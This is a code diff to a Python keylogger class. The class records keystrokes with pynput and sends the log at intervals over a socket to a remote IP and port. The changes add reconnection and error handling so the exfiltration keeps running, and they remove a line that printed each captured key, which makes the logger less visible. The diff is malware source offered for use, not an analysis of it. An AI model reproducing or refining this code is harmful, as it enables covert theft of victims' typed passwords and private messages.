@@ -3,8 +3,8 @@ from pynput import keyboard
 from threading import Timer
 from time import sleep
 import socket
-import sys
 import errno
+
 
 class Keylogger:
     def __init__(self, interval, ip, port, h_length):
@@ -28,6 +28,7 @@ class Keylogger:
     def _reconnect(self):
         while True:
             try:
+                self.client_socket.close()
                 self._connect()
             except Exception as e:
                 print(e)
@@ -42,7 +43,6 @@ class Keylogger:
     def _process_pressed_key(self, key):
         try:
             current_key = str(key.char)
-            print(key.char)
         except AttributeError:
             if key == key.space:
                 current_key = " "
@@ -63,19 +63,27 @@ class Keylogger:
             while True:
                 username_header = self.client_socket.recv(self.header_lenght)
                 if not len(username_header):
-                    self._reconnect()
+                    raise ConnectionError
+                username_length = int(username_header.decode('utf-8').strip())
+                username = self.client_socket.recv(username_length).decode('utf-8')
+                message_header = self.client_socket.recv(self.header_lenght)
+                message_length = int(message_header.decode('utf-8').strip())
+                message = self.client_socket.recv(message_length).decode('utf-8')
+                self.client_socket.close()
 
         except IOError as e:
             if e.errno != errno.EAGAIN and e.errno != errno.EWOULDBLOCK:
                 print(f'Reading error: {str(e)}')
-                sys.exit()
-        except Exception as e:
-            print(f'Reading error: {str(e)}')
-            sys.exit()
+                raise ConnectionError
 
     # function to print the user input in the given interval
     def _report(self):
-        self._send_2_server()
+        try:
+            self._send_2_server()
+        except ConnectionError as e:
+            print(e)
+            self._reconnect()
+            self._send_2_server()
         self.log = ""
         timer = Timer(self.interval, self._report)
         timer.start()
